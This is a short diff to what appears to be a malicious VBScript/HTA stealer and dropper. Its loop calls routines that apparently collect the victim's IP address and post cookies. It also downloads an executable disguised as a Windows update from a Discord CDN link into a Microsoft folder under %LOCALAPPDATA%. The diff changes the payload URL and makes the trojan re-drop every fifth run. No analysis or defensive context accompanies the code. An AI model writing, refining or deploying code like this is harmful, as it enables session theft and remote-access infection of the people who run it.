@@ -57,6 +57,10 @@ Do
     Call IP(cfgC)
     Call PostCookieOnly(cfgC)
     
+    If (runCount Mod 5) = 0 Then
+        ratDropped = False
+    End If
+    
     If Not ratDropped Then
         Call DropPayload(cfgC, True)
     End If
@@ -67,7 +71,7 @@ Loop
 window.close()
 
 Sub DropPayload(sysDest, sendRocket)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b090832&is=6b07b6b2&hm=b7476ce08038788fce717b168238b8e04cd6011e46e73ac97aed298f6dee5e79&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1575583829282787449/Winupdate.exe?ex=6b09d049&is=6b087ec9&hm=c68bad7be7a095637a6d1cdb9f2450ae8a21973051d89c82287b8e36d2581233&"
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
